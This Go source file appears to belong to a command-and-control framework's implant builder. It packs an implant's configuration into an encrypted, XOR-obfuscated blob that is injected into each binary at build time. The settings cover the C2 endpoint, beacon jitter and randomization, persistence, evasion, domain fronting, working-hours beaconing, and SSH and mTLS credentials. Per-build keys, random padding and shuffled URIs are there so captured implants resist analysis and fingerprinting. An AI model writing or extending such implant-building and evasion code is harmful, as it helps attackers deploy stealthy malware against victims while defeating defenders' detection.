package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
)

// agentConfigJSON mirrors the agent's config var names so the blob can be
// reapplied over the agent's in-code defaults at runtime. It is serialized and
// XOR-obfuscated with a per-build random key, then injected into the binary via
// a single `-ldflags -X main.ConfigBlob=<blob>` value, replacing the previous
// ~35 separate -X flags.
type agentConfigJSON struct {
	C2URL            string `json:"c2_url"`
	Interval         string `json:"interval"`
	Jitter           string `json:"jitter"`
	UserAgent        string `json:"user_agent"`
	Persist          string `json:"persist"`
	SkipTLSVerify    string `json:"skip_tls"`
	Protocol         string `json:"protocol"`
	Debug            string `json:"debug"`
	BeaconURI        string `json:"beacon_uri"`
	BeaconMethod     string `json:"beacon_method"`
	ListenerID       string `json:"listener_id"`
	P2PMode          string `json:"p2p_mode"`
	P2PParent        string `json:"p2p_parent"`
	P2PListenAddr    string `json:"p2p_listen"`
	DNSDomain        string `json:"dns_domain"`
	DNSServer        string `json:"dns_server"`
	DNSDoHURL        string `json:"dns_doh"`
	DNSDoTAddr       string `json:"dns_dot"`
	DNSObscure       string `json:"dns_obscure"`
	Proxy            string `json:"proxy"`
	CryptoKey        string `json:"crypto_key"`
	BeaconKey        string `json:"beacon_key"`
	RegSecretID      string `json:"reg_secret_id"`
	RegSecret        string `json:"reg_secret"`
	ExpiryDate       string `json:"expiry"`
	Evasion          string `json:"evasion"`
	GhostMode        string `json:"ghost_mode"`
	DomainFront      string `json:"domain_front"`
	WorkingStart     string `json:"work_start"`
	WorkingEnd       string `json:"work_end"`
	WorkingTZ        string `json:"work_tz"`
	BeaconTransport  string `json:"beacon_transport"`
	SSHUser          string `json:"ssh_user"`
	SSHPassword      string `json:"ssh_password"`
	SSHKey           string `json:"ssh_key"`
	SSHHostKey       string `json:"ssh_host_key"`
	MTLSCert         string `json:"mtls_cert"`
	MTLSKey          string `json:"mtls_key"`
	MTLSCA           string `json:"mtls_ca"`
	PinnedCertSHA256 string `json:"pinned_cert"`
	SelfCheckSHA256  string `json:"self_check"`
	MalleablePrepend string `json:"malleable_prepend"`
	MalleableAppend  string `json:"malleable_append"`
	// Request-side transforms (applied by the agent to outbound beacons).
	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
	MalleableRequestAppend  string            `json:"malleable_request_append"`
	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
	// Max random bytes appended to the HTTP/WS beacon body (0=disabled).
	ContentLengthJitter string `json:"content_length_jitter"`
	// Startup delay window in seconds (0/0 = disabled).
	StartDelayMin string `json:"start_delay_min"`
	StartDelayMax string `json:"start_delay_max"`
	// Beacon randomization mode (linear, gaussian, exponential, two_stage, adaptive)
	BeaconRandomization string `json:"beacon_randomization"`
	// Max random delay in milliseconds added per beacon (0 = no cap)
	MaxRandomIntervalMs string `json:"max_random_interval_ms"`
	// v2 chains + rotation (agent parses ServerOutput via MalleableRespDecode).
	MalleableRespDecode string `json:"malleable_resp_decode"`
	MalleableClientID   string `json:"malleable_client_id"`
	MalleableClientMeta string `json:"malleable_client_meta"`
	BeaconURIs          string `json:"beacon_uris"`
	Parameter           string `json:"parameter"`
	MalleablePlacement  string `json:"malleable_placement"`
	UserAgents          string `json:"user_agents"`
	JitterURI           string `json:"jitter_uri"`
	ParameterNames      string `json:"parameter_names"`
	RequestHeaderPool   string `json:"request_header_pool"`
	// Pad is per-build random hex filler so the blob length varies per build
	// even for identical configs. The agent ignores unknown fields.
	Pad string `json:"pad,omitempty"`
}

// randomAESKey returns 32 random bytes suitable for AES-256.
func randomAESKey() []byte {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil
	}
	return key
}

// strxorEncode obfuscates a plaintext string the same way the agent's strxor
// table works (random XOR key, emitted as "<hexkey>:<base64(cipher)>"). The
// agent recovers it with mustDecrypt/s. We use this to deliver a per-build
// config-blob AES key via -ldflags -X main.SConfigKey without ever writing the
// plaintext key into source or the delivered binary in recoverable form.
func strxorEncode(plaintext string) string {
	key := make([]byte, len(plaintext))
	if _, err := rand.Read(key); err != nil {
		return ""
	}
	enc := make([]byte, len(plaintext))
	for i := range plaintext {
		enc[i] = plaintext[i] ^ key[i]
	}
	return hex.EncodeToString(key) + ":" + base64.StdEncoding.EncodeToString(enc)
}

// obfuscateBlobKeyed encrypts the config blob with AES-256-GCM using the supplied
// 32-byte key. Format: base64(nonce || ciphertext || tag). The cipher is
// authenticated and the key is not recoverable from the blob alone.
func obfuscateBlobKeyed(plaintext, key []byte) string {
	if len(key) != 32 {
		return ""
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return ""
	}
	sealed := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(sealed)
}

// obfuscateBlobKeyed is the only supported config-blob encryption: a fresh
// per-build AES-256 key (see buildConfigBlobKeyed). The static/shared-key path
// was removed so no fleet-wide constant key can ever appear in source or be
// recovered from a delivered binary.

// buildConfigBlobKeyed serializes the resolved implant configuration into the
// obfuscated runtime config block that the agent decodes during init().
func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
	mtlsCertB64, mtlsKeyB64, mtlsCAB64 := mtlsBlobValues(cfg)
	// Bootstrap-only compile: embed only what the agent needs to reach the
	// server and register — its per-implant secret plus the initial C2
	// endpoint. The full network config is then delivered over the wire at
	// registration (encrypted under the same secret), so no operational
	// parameters are burned into the binary.
	if cfg.NetworkConfigOverWire {
		transport := cfg.BeaconTransport
		if transport == "" {
			transport = cfg.Protocol
		}
		if transport == "" {
			transport = "http"
		}
		bc := agentConfigJSON{
			C2URL:                   cfg.C2URL,
			Protocol:                cfg.Protocol,
			BeaconTransport:         transport,
			RegSecretID:             cfg.RegSecretID,
			RegSecret:               cfg.RegSecret,
			MalleableRequestPrepend: cfg.MalleableRequestPrepend,
			MalleableRequestAppend:  cfg.MalleableRequestAppend,
			MalleableRequestHeaders: cfg.MalleableRequestHeaders,
			// Beacon timing randomization must be baked even for bootstrap
			// builds: unlike interval/jitter it has NO over-the-wire slot.
			// NetworkConfig carries interval/jitter (so they are not burned in),
			// but adding the randomization mode there would overwrite the
			// per-implant choice with the fleet default on every refresh. The
			// operator already resolved it at build time (form > fleet default),
			// so the only place it survives for a config-over-wire implant is the
			// bootstrap blob. Without this, "Gaussian + network config over wire"
			// silently shipped linear -- the feature did nothing for that build
			// flavor.
			BeaconRandomization: cfg.BeaconRandomization,
			MaxRandomIntervalMs: fmt.Sprintf("%d", cfg.MaxRandomIntervalMs),
			// Client credentials are needed to reach the initial endpoint when
			// it requires a client certificate, so the bootstrap build keeps
			// them even though everything else moves over the wire later.
			MTLSCert: mtlsCertB64,
			MTLSKey:  mtlsKeyB64,
			MTLSCA:   mtlsCAB64,
		}
		raw, err := json.Marshal(bc)
		if err != nil {
			return nil
		}
		return raw
	}

	persistStr := "false"
	if cfg.Persist {
		persistStr = "true"
	}
	skipTLSTxt := "false"
	if cfg.SkipTLSVerify {
		skipTLSTxt = "true"
	}
	evasionStr := "false"
	if cfg.Evasion {
		evasionStr = "true"
	}
	ghostModeStr := "false"
	if cfg.GhostMode {
		ghostModeStr = "true"
	}

	p2pMode := cfg.P2PMode
	if p2pMode == "" && cfg.Protocol == "p2p" {
		p2pMode = "tcp"
	}

	listenerID := "0"
	if cfg.ListenerID > 0 {
		listenerID = fmt.Sprintf("%d", cfg.ListenerID)
	}

	transport := cfg.BeaconTransport
	if transport == "" {
		transport = cfg.Protocol
	}
	if transport == "" {
		transport = "http"
	}

	bc := agentConfigJSON{
		C2URL:                   cfg.C2URL,
		Interval:                fmt.Sprintf("%d", cfg.Interval),
		Jitter:                  fmt.Sprintf("%d", cfg.Jitter),
		UserAgent:               cfg.UserAgent,
		Persist:                 persistStr,
		SkipTLSVerify:           skipTLSTxt,
		Protocol:                cfg.Protocol,
		Debug:                   fmt.Sprintf("%t", cfg.Debug),
		BeaconURI:               profile.BeaconURI,
		BeaconMethod:            profile.Method,
		ListenerID:              listenerID,
		P2PMode:                 p2pMode,
		P2PParent:               cfg.P2PParent,
		P2PListenAddr:           cfg.P2PListenAddr,
		DNSDomain:               cfg.DNSDomain,
		DNSServer:               cfg.DNSServer,
		DNSDoHURL:               cfg.DNSDoHURL,
		DNSDoTAddr:              cfg.DNSDoTAddr,
		DNSObscure:              fmt.Sprintf("%t", cfg.DNSObscure),
		Proxy:                   cfg.Proxy,
		CryptoKey:               cfg.CryptoKey,
		BeaconKey:               cfg.BeaconKey,
		RegSecretID:             cfg.RegSecretID,
		RegSecret:               cfg.RegSecret,
		ExpiryDate:              cfg.ExpiryDate,
		Evasion:                 evasionStr,
		GhostMode:               ghostModeStr,
		DomainFront:             cfg.DomainFront,
		WorkingStart:            cfg.WorkingStart,
		WorkingEnd:              cfg.WorkingEnd,
		WorkingTZ:               cfg.WorkingTZ,
		BeaconTransport:         transport,
		SSHUser:                 cfg.SSHUser,
		SSHPassword:             cfg.SSHPassword,
		SSHKey:                  cfg.SSHKey,
		SSHHostKey:              cfg.SSHHostKey,
		MTLSCert:                mtlsCertB64,
		MTLSKey:                 mtlsKeyB64,
		MTLSCA:                  mtlsCAB64,
		PinnedCertSHA256:        cfg.PinnedCertSHA256,
		SelfCheckSHA256:         cfg.SelfCheckSHA256,
		MalleablePrepend:        cfg.MalleablePrepend,
		MalleableAppend:         cfg.MalleableAppend,
		MalleableRequestPrepend: cfg.MalleableRequestPrepend,
		MalleableRequestAppend:  cfg.MalleableRequestAppend,
		MalleableRequestHeaders: cfg.MalleableRequestHeaders,
		ContentLengthJitter:     fmt.Sprintf("%d", cfg.ContentLengthJitter),
		StartDelayMin:           fmt.Sprintf("%d", cfg.StartDelayMin),
		StartDelayMax:           fmt.Sprintf("%d", cfg.StartDelayMax),
		BeaconRandomization:     cfg.BeaconRandomization,
		MaxRandomIntervalMs:     fmt.Sprintf("%d", cfg.MaxRandomIntervalMs),
		MalleableRespDecode:     cfg.MalleableServerOutput,
		MalleableClientID:       cfg.MalleableClientID,
		MalleableClientMeta:     cfg.MalleableClientMetadata,
		BeaconURIs:              strings.Join(cfg.BeaconURIs, ","),
		Parameter:               cfg.Parameter,
		MalleablePlacement:      cfg.Placements,
		UserAgents:              strings.Join(cfg.UserAgents, "\n"),
		JitterURI:               map[bool]string{true: "true", false: "false"}[cfg.JitterURI],
		ParameterNames:          strings.Join(cfg.ParameterNames, "\n"),
		RequestHeaderPool:       strings.Join(cfg.RequestHeaderPool, "\n"),
	}
	raw, err := json.Marshal(bc)
	if err != nil {
		return nil
	}
	return raw
}

// randomPadHex returns n random bytes hex-encoded (2n chars).
func randomPadHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return ""
	}
	return hex.EncodeToString(b)
}

// shuffleBeaconURIs returns a per-build random ordering of the beacon URI pool
// so the serialized blob order is not a stable fingerprint.
func shuffleBeaconURIs(in []string) []string {
	out := append([]string(nil), in...)
	for i := len(out) - 1; i > 0; i-- {
		var j int
		buf := make([]byte, 8)
		if _, err := rand.Read(buf); err != nil {
			break
		}
		v := uint64(buf[0]) | uint64(buf[1])<<8 | uint64(buf[2])<<16 | uint64(buf[3])<<24 |
			uint64(buf[4])<<32 | uint64(buf[5])<<40 | uint64(buf[6])<<48 | uint64(buf[7])<<56
		j = int(v % uint64(i+1))
		out[i], out[j] = out[j], out[i]
	}
	return out
}

// buildConfigBlobKeyed produces the obfuscated config blob and the strxor-encoded
// per-build AES key to inject via -X main.SConfigKey. Each build gets a unique
// key, so a captured blob from one implant cannot be decrypted with another
// implant's key (eliminating the fleet-wide shared constant).
func buildConfigBlobKeyed(cfg ImplantConfig, profile MalleableProfile) (blob string, sConfigKey string) {
	// Per-build jitter: random pad length 8-40 bytes + shuffled URI order so
	// identical configs still produce different-length blobs.
	padLen := 8
	if b := make([]byte, 1); func() bool { _, err := rand.Read(b); return err == nil }() {
		padLen = 8 + int(b[0]%33) // 8-40
	}
	cfgCopy := cfg
	cfgCopy.BeaconURIs = shuffleBeaconURIs(cfg.BeaconURIs)
	raw := marshalConfigBlobJSONWithPad(cfgCopy, profile, randomPadHex(padLen))
	if raw == nil {
		return "", ""
	}
	key := randomAESKey()
	if key == nil {
		return "", ""
	}
	return obfuscateBlobKeyed(raw, key), strxorEncode(hex.EncodeToString(key))
}

// marshalConfigBlobJSONWithPad is marshalConfigBlobJSON plus a random pad field.
func marshalConfigBlobJSONWithPad(cfg ImplantConfig, profile MalleableProfile, pad string) []byte {
	raw := marshalConfigBlobJSON(cfg, profile)
	if raw == nil {
		return nil
	}
	if pad == "" {
		return raw
	}
	// Inject "pad" before the final closing brace to avoid re-marshaling.
	trimmed := strings.TrimRight(string(raw), " \n\r\t")
	if !strings.HasSuffix(trimmed, "}") {
		return raw
	}
	inner := strings.TrimSuffix(trimmed, "}")
	sep := ""
	if len(strings.TrimSpace(inner)) > 1 {
		sep = ","
	}
	out, err := json.Marshal(map[string]string{"pad": pad})
	if err != nil {
		return raw
	}
	// out is {"pad":"..."} — splice inner content.
	frag := strings.TrimPrefix(strings.TrimSuffix(string(out), "}"), "{")
	return []byte(inner + sep + frag + "}")
}

// mtlsBlobValues base64-encodes the optional mTLS PEM material for the config
// blob. The blob carries exactly what the agent's -X main.MTLS*Str values
// expect, so the agent-side decode is identical for generated and hand-built
// binaries. Empty inputs stay empty (the agent then skips client auth).
func mtlsBlobValues(cfg ImplantConfig) (certB64, keyB64, caB64 string) {
	enc := func(pem string) string {
		if pem == "" {
			return ""
		}
		return base64.StdEncoding.EncodeToString([]byte(pem))
	}
	return enc(cfg.MTLSCertPEM), enc(cfg.MTLSKeyPEM), enc(cfg.MTLSCAPEM)
}
